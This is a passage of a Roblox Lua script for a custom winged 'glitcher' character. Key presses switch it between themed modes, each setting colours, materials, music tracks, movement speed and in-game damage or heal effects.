WingMat2 = Enum.Material.Glass,
CoreMat = Enum.Material.Neon,
wstyle = "StarterMode",
txtg1 = ColorSequence.new(Color3.new(0,0,1),Color3.new(1,0,0)),
txtg2 = ColorSequence.new(Color3.new(1,0,0),Color3.new(0,0,1)),
txtg3 = ColorSequence.new(Color3.new(0,0,1),Color3.new(1,0,0)),
musicid = 511836626,
musicname = "Desmeon - On That Day",
musicpit = 1.05,
musicvol = 1,
musicpos = "DontChange",
ws = 16,
jp = 100,
emotion = Upset(),
ExtraOptions = false,
--Extra options
Unleashed = false,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})

end
ModeChangeEnd()
end
if k == "n" and attack == false and ModeOfCharacter == "Exasperation" then
--ModeChangeExp()
ModeChangeStart(Color3.new(1,0,0),Color3.new(0,0,1))

ModeSwitch({

Name = "Despondency",
desc = "Depression, Sadness and madness. It hits hard... To lose someone you love.",
font = "Code",
modestring = "Despondency",
wcol1 = Color3.new(0.3,0,0),
wcol2 = Color3.new(0,0,0.1),
wcorecol1 = Color3.new(.3,0,0),
wcorecol2 = Color3.new(0,0,.2),
eyecol1 = Color3.fromRGB(0,0,0),
eyecol2 = Color3.fromRGB(0,0,0),
wtr1 = 0.7,
wtr2 = 0.7,
WingMat1 = Enum.Material.Glass,
WingMat2 = Enum.Material.Glass,
CoreMat = Enum.Material.ForceField,
wstyle = "SpiralStatic",
txtg1 = ColorSequence.new(Color3.new(0,0,0),Color3.new(.5,0,0)),
txtg2 = ColorSequence.new(Color3.new(.3,0,0),Color3.new(0.2,0.2,.2)),
txtg3 = ColorSequence.new(Color3.new(0,0,0),Color3.new(.5,0,0)),
musicid = 6140735953,
musicname = "Desmeon - On That Day (Light Years Away VIP)",
musicpit = 0.95,
musicvol = 1,
musicpos = 19,
ws = 16,
jp = 100,
emotion = Fearful(),
ExtraOptions = false,
--Extra options
Unleashed = false,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
ModeChangeEnd()
end

if k == "m" and attack == false and ModeOfCharacter == "Exasperation" then
local rdme = math.random(1,5)
if rdme == 5 then
HostileIntroStart()
--ModeChangeExp()
local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.In
local animatetime = .01
Animate(RootJoint,cf(0,2,0)*angles(math.rad(-27.9),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-0.9,-0.3)*angles(math.rad(45.1),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-0.5,-0.7)*angles(math.rad(1.7),math.rad(-0.6),math.rad(2.7))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-0.6,0.2,-0.5)*angles(math.rad(15.9),math.rad(19.3),math.rad(102.1)),animatetime,easingstyle,easingdir)
Animate(RW,cf(0.6,0.2,-0.9)*angles(math.rad(168.4),math.rad(-4.8),math.rad(-86.8)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(36.8),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
ModeSwitch({

Name = "Hostility",
desc = "Hey wait... Haven't I heard this name before?",
font = "Fantasy",
modestring = "Hostility",
wcol1 = Color3.new(0.5,0,0),
wcol2 = Color3.new(1,0,0),
wcorecol1 = Color3.new(1,0,0),
wcorecol2 = Color3.new(.5,0,0),
eyecol1 = Color3.fromRGB(255,0,0),
eyecol2 = Color3.fromRGB(255,0,0),
wtr1 = 0.7,
wtr2 = 0.5,
WingMat1 = Enum.Material.Neon,
WingMat2 = Enum.Material.Neon,
CoreMat = Enum.Material.Neon,
wstyle = "FlyingClassic",
txtg1 = ColorSequence.new(Color3.new(1,0,0),Color3.new(.5,0,0),Color3.new(1,0.2,0)),
txtg2 = ColorSequence.new(Color3.new(0.5,0,0),Color3.new(1,0.2,0),Color3.new(1,0,0)),
txtg3 = ColorSequence.new(Color3.new(1,0.2,0),Color3.new(1,0,0),Color3.new(0.5,0,0)),
musicid = 1693948941,
musicname = "Kobaryo - Tool-Assisted Speedrun (TQBF Frame Advance RMX)",
musicpit = 1.02,
musicvol = 10,
musicpos = 0,
ws = 50,
jp = 300,
emotion = Peeved(),
ExtraOptions = false,
--Extra options
Unleashed = false,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.In
local animatetime = .01
Animate(RootJoint,cf(0,2,0)*angles(math.rad(-27.9),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-0.9,-0.3)*angles(math.rad(45.1),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-0.5,-0.7)*angles(math.rad(1.7),math.rad(-0.6),math.rad(2.7))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-0.6,0.2,-0.5)*angles(math.rad(15.9),math.rad(19.3),math.rad(102.1)),animatetime,easingstyle,easingdir)
Animate(RW,cf(0.6,0.2,-0.9)*angles(math.rad(168.4),math.rad(-4.8),math.rad(-86.8)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(36.8),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) task.wait(animatetime+.02)
HostileIntroEnd()
else
ModeSwitch({

Name = "INFLAMED",
desc = "Let's just say you're not going to get out of this alive.",
font = Enum.Font.Jura,
modestring = "Inflamed",
wcol1 = Color3.new(0.5,0,0),
wcol2 = Color3.new(1,0,0),
wcorecol1 = Color3.new(1,0,0),
wcorecol2 = Color3.new(.5,0,0),
eyecol1 = Color3.fromRGB(255,0,0),
eyecol2 = Color3.fromRGB(255,0,0),
wtr1 = 0,
wtr2 = 0,
wstyle = "Galaxy",
WingMat1 = Enum.Material.Neon,
WingMat2 = Enum.Material.ForceField,
CoreMat = Enum.Material.ForceField,
txtg1 = ColorSequence.new(Color3.new(1,0,0),Color3.new(.5,0,0),Color3.new(1,0.2,0)),
txtg2 = ColorSequence.new(Color3.new(0.5,0,0),Color3.new(1,0.2,0),Color3.new(1,0,0)),
txtg3 = ColorSequence.new(Color3.new(1,0.2,0),Color3.new(1,0,0),Color3.new(0.5,0,0)),
musicid = 1422487532,
musicname = "Camellia - Furry Cannon",
musicpit = 1.02,
musicvol = 2,
musicpos = 157,
ws = 16,
jp = 300,
emotion = Neutral(),
ExtraOptions = false,
--Extra options
Unleashed = true,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
end
end
if k == "2" and attack == false and ModeOfCharacter ~= "Serene" then
--ModeChangeExp()
ModeChangeStart(Color3.new(0,1,.65),Color3.new(0,1,1))
ModeSwitch({

Name = "Serene",
desc = "Joyful, Gleeful, Not a care in the world.",
font = "Arcade",
modestring = "Serene",
wcol1 = Color3.new(0,1,1),
wcol2 = Color3.new(0,.5,1),
wcorecol1 = Color3.new(0,1,.65),
wcorecol2 = Color3.new(0,1,1),
eyecol1 = Color3.fromRGB(0,0,255),
eyecol2 = Color3.fromRGB(0,0,255),
wtr1 = 0,
wtr2 = 0,
WingMat1 = Enum.Material.Neon,
WingMat2 = Enum.Material.Neon,
CoreMat = Enum.Material.Neon,
wstyle = "Classic",
txtg1 = ColorSequence.new(Color3.new(0,.5,1),Color3.new(0,1,1)),
txtg2 = ColorSequence.new(Color3.new(0,1,1),Color3.new(0,.5,1)),
txtg3 = ColorSequence.new(Color3.new(0,.5,1),Color3.new(0,1,1)),
musicid = 5894657127,
musicname = "DerpzDeNugget - Expern Dreams",
musicpit = 1,
musicvol = 1,
musicpos = "DontChange",
ws = 16,
jp = 100,
emotion = Happy(),
ExtraOptions = false,
--Extra options
Unleashed = false,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
ModeChangeEnd()
end
if k == "m" and attack == false and ModeOfCharacter == "Serene" then
--ModeChangeExp()
ModeChangeStart(Color3.new(0,0,.5),Color3.new(0,0,.3))
local funnyid = 0
local funnyname = ""
local rdm = math.random(1,2)
if rdm == 1 then
funnyid = 4597796561
funnyname = "Geoxor - Neon Eyes"
elseif rdm == 2 then
funnyid = 3780810795
funnyname = "Geoxor - Euphoria"
end
ModeSwitch({

Name = "Unrestrained",
desc = "Relax.",
font = "IndieFlower",
modestring = "Unrestrained",
wcol1 = Color3.new(0,0,.3),
wcol2 = Color3.new(0,0,.5),
wcorecol1 = Color3.new(0,0,.5),
wcorecol2 = Color3.new(0,0,.3),
eyecol1 = Color3.fromRGB(0,0,150),
eyecol2 = Color3.fromRGB(0,0,150),
wtr1 = 0,
wtr2 = 0,
WingMat1 = Enum.Material.Neon,
WingMat2 = Enum.Material.Glass,
CoreMat = Enum.Material.Neon,
wstyle = "Classic",
txtg1 = ColorSequence.new(Color3.new(0,0,.5),Color3.new(0,0,1)),
txtg2 = ColorSequence.new(Color3.new(0,0,1),Color3.new(0,0,.5)),
txtg3 = ColorSequence.new(Color3.new(0,0,.5),Color3.new(0,0,1)),
musicid = funnyid,
musicname = funnyname,
musicpit = 1,
musicvol = 1,
musicpos = 0,
ws = 18,
jp = 100,
emotion = Bored(),
ExtraOptions = false,
--Extra options
Unleashed = false,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
ModeChangeEnd()
end
if k == "n" and attack == false and ModeOfCharacter == "Serene" then
--ModeChangeExp()
ModeChangeStart(Color3.new(0,1,.65),Color3.new(0,1,1))
ModeSwitch({

Name = "Exstatic",
desc = "Party Maniac.",
font = "FredokaOne",
modestring = "Exstatic",
wcol1 = Color3.new(0,1,1),
wcol2 = Color3.new(0,.5,1),
wcorecol1 = Color3.new(0,1,.65),
wcorecol2 = Color3.new(0,1,1),
eyecol1 = Color3.fromRGB(0,0,0),
eyecol2 = Color3.fromRGB(0,0,0),
wtr1 = 0,
wtr2 = 0,
WingMat1 = Enum.Material.Neon,
WingMat2 = Enum.Material.Glass,
CoreMat = Enum.Material.Neon,
wstyle = "Classic",
txtg1 = ColorSequence.new(Color3.new(0,.5,1),Color3.new(0,1,1)),
txtg2 = ColorSequence.new(Color3.new(0,1,1),Color3.new(0,.5,1)),
txtg3 = ColorSequence.new(Color3.new(0,.5,1),Color3.new(0,1,1)),
musicid = 4862131378,
musicname = "Geoxor & Canonblade - Sakura",
musicpit = 1.05,
musicvol = 1,
musicpos = "DontChange",
ws = 40,
jp = 100,
emotion = Happy(),
ExtraOptions = false,
--Extra options
Unleashed = false,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
ModeChangeEnd()
end
if k == "b" and attack == false and ModeOfCharacter == "Serene" then
--ModeChangeExp()
ModeChangeStart(Color3.new(0,1,.65),Color3.new(0,1,1))
ModeSwitch({

Name = "Ambivalent",
desc = "The most joyful you can ever be.",
font = "FredokaOne",
modestring = "Ambivalent",
wcol1 = Color3.new(0, 0.45, 1),
wcol2 = Color3.new(1, 1, 1),
wcorecol1 = Color3.new(1, 1, 1),
wcorecol2 = Color3.new(0, 0.45, 1),
eyecol1 = Color3.fromRGB(0,255,255),
eyecol2 = Color3.fromRGB(0,255,255),
wtr1 = 0,
wtr2 = 0,
WingMat1 = Enum.Material.Neon,
WingMat2 = Enum.Material.Glass,
CoreMat = Enum.Material.Neon,
wstyle = "ClassicFlying",
txtg1 = ColorSequence.new(Color3.new(0,.5,1),Color3.new(1,1,1)),
txtg2 = ColorSequence.new(Color3.new(1,1,1),Color3.new(0,.5,1)),
txtg3 = ColorSequence.new(Color3.new(0,.5,1),Color3.new(1,0.2,0.2)),
musicid = 2878403701,
musicname = "Kobaryo - Joyful Virus",
musicpit = 1.05,
musicvol = 1,
musicpos = 0,
ws = 16,
jp = 100,
emotion = Happy(),
ExtraOptions = false,
--Extra options
Unleashed = false,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
ModeChangeEnd()
end
if k == "3" and attack == false and ModeOfCharacter ~= "Inexplicable" then
--ModeChangeExp()
ModeChangeStart(Color3.new(0,0,.2),Color3.new(.3,.3,.3))
ModeSwitch({

Name = "Inexplicable",
desc = "Unknown, Mysterious, Can't be accounted for.",
font = "SpecialElite",
modestring = "Inexplicable",
wcol1 = Color3.new(0,0,0),
wcol2 = Color3.new(0.1,0.1,0.2),
wcorecol1 = Color3.new(0.3,0.3,0.3),
wcorecol2 = Color3.new(0,0,0),
eyecol1 = Color3.fromRGB(0,255,255),
eyecol2 = Color3.fromRGB(0,255,255),
wtr1 = 0,
wtr2 = 0,
WingMat1 = Enum.Material.Glass,
WingMat2 = Enum.Material.Glass,
CoreMat = Enum.Material.Neon,
wstyle = "Spinning",
txtg1 = ColorSequence.new(Color3.new(0,0,0),Color3.new(0.6,0.6,0.6)),
txtg2 = ColorSequence.new(Color3.new(0,0,0.2),Color3.new(0,0,0)),
txtg3 = ColorSequence.new(Color3.new(1,1,1),Color3.new(0,0,0)),
musicid = 4896080896,
musicname = "Geoxor - Abandoned",
musicpit = 1,
musicvol = 1,
musicpos = "DontChange",
ws = 16,
jp = 100,
emotion = Smirk(),
ExtraOptions = false,
--Extra options
Unleashed = false,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
ModeChangeEnd()
end
if k == "n" and attack == false and ModeOfCharacter == "Demented" then
--ModeChangeExp()
ModeChangeStart(Color3.new(.5,0,0),Color3.new(1,0,0))
ModeSwitch({

Name = "Iniquitous",
desc = "Grossly unfair, Corrupt, Morally wrong.",
font = "Ubuntu",
modestring = "Iniquitous",
wcol1 = Color3.new(0,0,0),
wcol2 = Color3.new(0.1,0.1,0.2),
wcorecol1 = Color3.new(0.3,0.3,0.3),
wcorecol2 = Color3.new(0,0,0),
eyecol1 = Color3.fromRGB(0,0,0),
eyecol2 = Color3.fromRGB(0,0,0),
wtr1 = 0,
wtr2 = 0,
WingMat1 = Enum.Material.Metal,
WingMat2 = Enum.Material.CorrodedMetal,
CoreMat = Enum.Material.DiamondPlate,
wstyle = "Spinning",
txtg1 = ColorSequence.new(Color3.new(0,0,0),Color3.new(0.6,0.6,0.6)),
txtg2 = ColorSequence.new(Color3.new(0,0,0.2),Color3.new(0,0,0)),
txtg3 = ColorSequence.new(Color3.new(1,1,1),Color3.new(0,0,0)),
musicid = 767898806,
musicname = "Virtual Riot - Rampage",
musicpit = 1,
musicvol = 1,
musicpos = "DontChange",
ws = 50,
jp = 100,
emotion = Emotionless(),
ExtraOptions = false,
--Extra options
Unleashed = false,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
ModeChangeEnd()
end
if k == "4" and attack == false and ModeOfCharacter ~= "Demented" then
--ModeChangeExp()
ModeChangeStart(BrickColor.Random().Color,BrickColor.Random().Color)
ModeSwitch({

Name = "Schizophrenic",
desc = "...Edgy.",
font = "Arcade",
modestring = "Demented",
wcol1 = Color3.new(0,0,0),
wcol2 = Color3.new(0.1,0.1,0.2),
wcorecol1 = Color3.new(0.3,0.3,0.3),
wcorecol2 = Color3.new(0,0,0),
eyecol1 = Color3.fromRGB(0,0,0),
eyecol2 = Color3.fromRGB(0,0,0),
wtr1 = 0,
wtr2 = 0,
WingMat1 = Enum.Material.Neon,
WingMat2 = Enum.Material.Neon,
CoreMat = Enum.Material.Neon,
wstyle = "DementedStyle",
txtg1 = ColorSequence.new(Color3.new(0,0,0),Color3.new(0.6,0.6,0.6)),
txtg2 = ColorSequence.new(Color3.new(0,0,0.2),Color3.new(0,0,0)),
txtg3 = ColorSequence.new(Color3.new(1,1,1),Color3.new(0,0,0)),
musicid = 5857098165,
musicname = "RIOT - Overkill",
musicpit = 1,
musicvol = 1,
musicpos = "DontChange",
ws = 16,
jp = 100,
emotion = Upset(),
ExtraOptions = false,
--Extra options
Unleashed = false,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
ModeChangeEnd()
end

if k == "m" and attack == false and ModeOfCharacter == "Demented" then
--ModeChangeExp()
ModeSwitch({

Name = "DEMENTED",
desc = "Woah, We're referencing past glitchers now? That's still edgy.",
font = "Arcade",
modestring = "Demented+",
wcol1 = Color3.new(0,0,0),
wcol2 = Color3.new(0.1,0.1,0.2),
wcorecol1 = Color3.new(0.3,0.3,0.3),
wcorecol2 = Color3.new(0,0,0),
eyecol1 = Color3.fromRGB(0,0,0),
eyecol2 = Color3.fromRGB(0,0,0),
wtr1 = 0,
wtr2 = 0,
WingMat1 = Enum.Material.Neon,
WingMat2 = Enum.Material.Neon,
CoreMat = Enum.Material.Neon,
wstyle = "DementedStyle",
txtg1 = ColorSequence.new(Color3.new(0,0,0),Color3.new(0.6,0.6,0.6)),
txtg2 = ColorSequence.new(Color3.new(0,0,0.2),Color3.new(0,0,0)),
txtg3 = ColorSequence.new(Color3.new(1,1,1),Color3.new(0,0,0)),
musicid = 4027028379,
musicname = "RIOT - Overkill (AXEN Remix)",
musicpit = 1,
musicvol = 1,
musicpos = "DontChange",
ws = 16,
jp = 100,
emotion = Determined(),
ExtraOptions = true,
--Extra options
Unleashed = true,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
end
if k == "5" and attack == false and ModeOfCharacter ~= "Atmospherical" then
--ModeChangeExp()
local funnyid = 0
local funnyname = ""
local rdm = math.random(1,2)
if rdm == 1 then
funnyid = 1327427310
funnyname = "Camellia - Rain Of Amethyst"
elseif rdm == 2 then
funnyid = 177375821
funnyname = "Dope Arcade - Ascension (MitiS Remix)"
end
ModeChangeStart(Color3.new(0.4,.9,.9),Color3.new(1,1,1))
ModeSwitch({

Name = "Atmospherical",
desc = "Fly to the best of your ability.",
font = "Nunito",
modestring = "Atmospherical",
wcol1 = Color3.new(0.4,0.9,0.9),
wcol2 = Color3.new(0.1,0.5,0.9),
wcorecol1 = Color3.new(0.4,0.9,0.9),
wcorecol2 = Color3.new(1,1,1),
eyecol1 = Color3.new(0.4,0.9,0.9),
eyecol2 = Color3.new(0.4,0.9,0.9),
wtr1 = 0.3,
wtr2 = 0.3,
WingMat1 = Enum.Material.Neon,
WingMat2 = Enum.Material.Glass,
CoreMat = Enum.Material.Neon,
wstyle = "FlyingClassic",
txtg1 = ColorSequence.new(Color3.new(0.4,0.9,0.9),Color3.new(0,0.5,0.9)),
txtg2 = ColorSequence.new(Color3.new(0,0.5,0.9),Color3.new(0.4,0.9,0.9)),
txtg3 = ColorSequence.new(Color3.new(0.4,0.9,0.9),Color3.new(0,0.5,0.9)),
musicid = funnyid,
musicname = funnyname,
musicpit = 1,
musicvol = 4,
musicpos = "DontChange",
ws = 70,
jp = 100,
emotion = Happy(),
ExtraOptions = false,
--Extra options
Unleashed = false,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
ModeChangeEnd()
end
if k == "6" and attack == false and ModeOfCharacter ~= "Decorumed" then
--ModeChangeExp()
ModeChangeStart(Color3.new(0,0,0),Color3.new(1,1,1))
ModeSwitch({

Name = "Decorumed",
desc = "To be balanced, Fair. Like Yin & Yang.",
font = "Nunito",
modestring = "Decorumed",
wcol1 = Color3.new(1,1,1),
wcol2 = Color3.new(0,0,0),
wcorecol1 = Color3.new(0,0,0),
wcorecol2 = Color3.new(1,1,1),
eyecol1 = Color3.new(0,0,0),
eyecol2 = Color3.new(1,1,1),
wtr1 = 0.3,
wtr2 = 0.3,
WingMat1 = Enum.Material.Neon,
WingMat2 = Enum.Material.Metal,
CoreMat = Enum.Material.Neon,
wstyle = "SpiralStatic",
txtg1 = ColorSequence.new(Color3.new(1,1,1),Color3.new(0,0,0)),
txtg2 = ColorSequence.new(Color3.new(0,0,0),Color3.new(1,1,1)),
txtg3 = ColorSequence.new(Color3.new(1,1,1),Color3.new(0,0,0)),
musicid = 1448870823,
musicname = "uma vs. モリモリあつし - Re: End of a Dream",
musicpit = 1.03,
musicvol = 4,
musicpos = "DontChange",
ws = 150,
jp = 100,
emotion = Happy(),
ExtraOptions = false,
--Extra options
Unleashed = false,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
ModeChangeEnd()
end
if k == "m" and attack == false and ModeOfCharacter == "Decorumed" then
--ModeChangeExp()
ModeChangeStart(Color3.new(0.333333, 1, 1),Color3.new(0.333333, 1, 0.498039))
ModeSwitch({

Name = "Expeditious",
desc = "Speed. It's key.",
font = Enum.Font.Bangers,
modestring = "Expeditious",
wcol1 = Color3.new(0.333333, 1, 1),
wcol2 = Color3.new(0.305882, 1, 0.733333),
wcorecol1 = Color3.new(0.333333, 1, 1),
wcorecol2 = Color3.new(0.305882, 1, 0.733333),
eyecol1 = Color3.new(0.0431373, 0.698039, 1),
eyecol2 = Color3.new(0.0431373, 0.698039, 1),
wtr1 = 0,
wtr2 = .9,
WingMat1 = Enum.Material.Neon,
WingMat2 = Enum.Material.Glass,
CoreMat = Enum.Material.Neon,
wstyle = "Galaxy",
txtg1 = ColorSequence.new(Color3.new(1,1,1),Color3.new(0,0,0)),
txtg2 = ColorSequence.new(Color3.new(0,0,0),Color3.new(1,1,1)),
txtg3 = ColorSequence.new(Color3.new(1,1,1),Color3.new(0,0,0)),
musicid = 4782774248,
musicname = "T+Pazolite & Getty - Twisted Drop Party",
musicpit = 1.03,
musicvol = 4,
musicpos = "DontChange",
ws = 500,
jp = 150,
emotion = Smirk(),
ExtraOptions = false,
--Extra options
Unleashed = false,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
ModeChangeEnd()
end
if k == "m" and attack == false and ModeOfCharacter == "Atmospherical" then
NOTTHISAGAIN()
end
if k == "7" and attack == false and ModeOfCharacter ~= "Varicolored" then
--ModeChangeExp()
ModeChangeStart(Color3.new(0,0,0),Color3.new(1,1,1))
ModeSwitch({

Name = "Varicolored",
desc = "My eyes.. They hurt. So much.",
font = "Arcade",
modestring = "Varicolored",
wcol1 = Color3.new(1,1,1),
wcol2 = Color3.new(0,0,0),
wcorecol1 = Color3.new(0,0,0),
wcorecol2 = Color3.new(1,1,1),
eyecol1 = Color3.new(0,0,0),
eyecol2 = Color3.new(1,1,1),
wtr1 = 0.3,
wtr2 = 0.3,
WingMat1 = Enum.Material.Neon,
WingMat2 = Enum.Material.Neon,
CoreMat = Enum.Material.Neon,
wstyle = "SpiralStatic",
txtg1 = ColorSequence.new(Color3.new(1,1,1),Color3.new(0,0,0)),
txtg2 = ColorSequence.new(Color3.new(0,0,0),Color3.new(1,1,1)),
txtg3 = ColorSequence.new(Color3.new(1,1,1),Color3.new(0,0,0)),
musicid = 2176435814,
musicname = "翡乃イスカ - Dreamin Attraction",
musicpit = 1.03,
musicvol = 4,
musicpos = "DontChange",
ws = 150,
jp = 100,
emotion = Neutral(),
ExtraOptions = false,
--Extra options
Unleashed = false,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
ModeChangeEnd()




end
if k == "9" and attack == false and ModeOfCharacter ~= "Herculean" then
--ModeChangeExp()
ModeChangeStart(Color3.new(0,0,0),Color3.new(1,1,1))
ModeSwitch({

Name = "Herculean",
desc = "The victor, The savior, The sovereign one.",
font = Enum.Font.Sarpanch,
modestring = "Herculean",
wcol1 = Color3.fromRGB(172, 151, 255),
wcol2 = Color3.fromRGB(49, 110, 184),
wcorecol1 = Color3.fromRGB(49, 110, 184),
wcorecol2 = Color3.fromRGB(172, 151, 255),
eyecol1 = Derpz_EyeColor,
eyecol2 = Derpz_EyeColor,
wtr1 = 0.3,
wtr2 = 0.3,
WingMat1 = Enum.Material.ForceField,
WingMat2 = Enum.Material.Neon,
CoreMat = Enum.Material.Neon,
wstyle = "SpiralStatic",
txtg1 = ColorSequence.new(Color3.fromRGB(172, 151, 255),Color3.new(0,0,0)),
txtg2 = ColorSequence.new(Color3.fromRGB(172, 151, 255),Color3.fromRGB(49, 110, 184)),
txtg3 = ColorSequence.new(Color3.fromRGB(172, 151, 255),Color3.new(0,0,0)),
musicid = 1537276744,
musicname = "Pegboard Nerds - Hero",
musicpit = 1.03,
musicvol = 4,
musicpos = "DontChange",
ws = 150,
jp = 100,
emotion = Smirk(),
ExtraOptions = false,
--Extra options
Unleashed = false,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
ModeChangeEnd()




end
if k == "0" and attack == false and ModeOfCharacter ~= "meme" then
--ModeChangeExp()
ModeChangeStart(Color3.new(1, 0, 1),Color3.new(1,1,1))
ModeSwitch({

Name = "that moment when derpz makes another glitcher",
desc = "like really, when is this guy gonna stop???",
font = "Cartoon",
modestring = "meme",
wcol1 = Color3.new(1,1,1),
wcol2 = Color3.new(0,0,0),
wcorecol1 = Color3.new(0.513725, 0.101961, 0.54902),
wcorecol2 = Color3.new(0.933333, 0.188235, 1),
eyecol1 = Color3.new(0,0,.7),
eyecol2 = Color3.new(0,0,.7),
wtr1 = 1,
wtr2 = 1,
WingMat1 = Enum.Material.Cobblestone,
WingMat2 = Enum.Material.Brick,
CoreMat = Enum.Material.Foil,
wstyle = "SpiralVisualiser",
txtg1 = ColorSequence.new(Color3.new(0.933333, 0.188235, 1),Color3.new(0.513725, 0.101961, 0.54902)),
txtg2 = ColorSequence.new(Color3.new(0.513725, 0.101961, 0.54902),Color3.new(0.933333, 0.188235, 1)),
txtg3 = ColorSequence.new(Color3.new(0.933333, 0.188235, 1),Color3.new(0.513725, 0.101961, 0.54902)),
musicid = 1684954317,
musicname = "pizza time",
musicpit = 1.03,
musicvol = 4,
musicpos = "DontChange",
ws = 999,
jp = 999,
emotion = HappyMemey(),
ExtraOptions = false,
--Extra options
Unleashed = false,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
ModeChangeEnd()
end
if k == "u" and attack == false and smuggyval == false then
smuggyval = true
smuggy()
elseif k == "u" and attack == true and smuggyval == true then
smuggyval = false
end
if k == "q" then
--dmg(game.Workspace.DmgFuncTest)
DerpzDmg({

Part = workspace.DmgFuncTest.Torso,
Magnitude = 3,
MinimumDamage = 4,
MaximumDamage = 10,
Type = "Burn",
TypeInfoNeeded = true,
FireDamageAmount = 4,
FireDamageTime = 1,


})
end
if k == "c" and ModeOfCharacter == "Serene" then
--dmg(game.Workspace.DmgFuncTest)
DerpzDmg({

Part = tors,
Magnitude = 10,
MinimumDamage = 10,
MaximumDamage = 100,
Type = "Heal"


})
end
if k == "y" and attack == false then
swimtypechange()
end
if k == "t" and attack == false then
sittingstylechange()
end


if k == "e" and attack == false then
ChangeChar()
end

end)
mouse.KeyUp:connect(function(k)

end)






-- plr.Chatted:connect(function(message)
-- local filter = game:GetService("TextService"):FilterStringAsync(message, plr.UserId)
-- local filteredTextResult = filter:GetNonChatStringForBroadcastAsync() -- Filter so you dont get banned for bypass, Change Message to "filteredTextResult"
-- if ModeOfCharacter == "Varicolored" then
-- if message:sub(1,3):lower() == "id/" then
-- DerpzMusic.SoundId = "rbxassetid://"..message:sub(4)
-- print("[DG:TFC] Changed Varicolored ID to "..message:sub(4))
-- local a,success = pcall(function()
-- songnameboi = game:GetService("MarketplaceService"):GetProductInfo(message:sub(4)).Name
-- end)
-- if success then
-- print("[DG:TFC] Successfully changed User UI Music name")
-- chatfunc("Now playing: "..songnameboi,20,wing1.Core.Color)
-- else
-- print("[DG:TFC] Failed to change User UI Music name (ID doesn't exist?)")
-- songnameboi = "Couldn't load song name. Did you type it in correctly?"
-- end
-- else
-- chatfunc(filteredTextResult,20,wing1.Core.Color)
-- end
-- else
-- chatfunc(filteredTextResult,20,wing1.Core.Color)
-- end

-- end)





--song name
--DerpzMusic.SoundId = "rbxassetid://4801578241"
--songnameboi = "Noah - Necrofantasia"
--MainFrame.SongName.Text = "Music Name: " ..songnameboi
--song name


doinglol = false


heckfallnum = 1
youredead = false
--RNG to depend if you fall to your death while falling down, or live and go straight down without a scratch.
rdm = math.random(1,2)
if rdm == 0 then
heckfallnum = 1
else
heckfallnum = 2
end

--Click, Letter and Number Key Setup + Chat Setup

--Protection & Name
Humanoid.Name = "GLITCHERS ARE CRINGE"
--Instance.new("ForceField",char).Visible = false
--Protection & Name

--"while true do" Animations, repeated colors, effects
tired = false
particles = script.Particles
particles.Parent = Head
hahayes = 0
local YOUAREDEAD = false

--Intro lollelelelle
Intro()




while true do




--Special mode stuff
if ModeOfCharacter == "Ambivalent" then
if DerpzMusic.TimePosition < 1 then
YOUAREDEAD = false
songnameboi = "Kobaryo - Joyful Virus"
elseif math.floor(DerpzMusic.TimePosition) == 20 then
YOUAREDEAD = true
songnameboi = "Kobaryo - Villan Virus"
elseif math.floor(DerpzMusic.TimePosition) == 179 and YOUAREDEAD == true then
YOUAREDEAD = "False?"
songnameboi = "Kobaryo - Joyful Virus"
elseif math.floor(DerpzMusic.TimePosition) == 209 and YOUAREDEAD == "False?" then
YOUAREDEAD = true
songnameboi = "Kobaryo - Villan Virus"
end
end
--Exp Sub-Major stuff
